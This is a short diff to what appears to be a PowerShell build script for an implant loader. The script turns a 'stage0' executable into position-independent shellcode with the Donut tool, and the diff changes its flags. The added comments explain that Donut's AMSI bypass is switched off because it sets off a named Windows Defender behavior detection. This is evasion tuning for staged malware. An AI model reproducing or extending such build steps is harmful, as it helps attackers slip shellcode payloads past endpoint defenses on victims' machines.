@@ -147,7 +147,9 @@ Write-Host "[2/4] Converting to PIC shellcode with Donut ..." -ForegroundColor Y
 # the JAVELIN thread. ESTER keeps the process alive via an infinite loop, so
 # the Donut shellcode returning from stage0 startup does not kill the process.
 # -x 1 = ExitThread (not ExitProcess) if stage0's entry point ever returns.
-& $DonutExe -i $ExePath -o $ScPath -a 2 -f 1 -x 1 -e 3 -t
+# -b 1 = No AMSI/WLDP bypass: stage0_lite.exe is a native C PE (not .NET),
+# AMSI patching is unnecessary and triggers Behavior:Win32/AMSI_Patch_T.B12
+& $DonutExe -i $ExePath -o $ScPath -a 2 -f 1 -b 1 -x 1 -e 3 -t
 
 if ($LASTEXITCODE -ne 0) {
     Write-Host "DONUT FAILED (exit $LASTEXITCODE)" -ForegroundColor Red
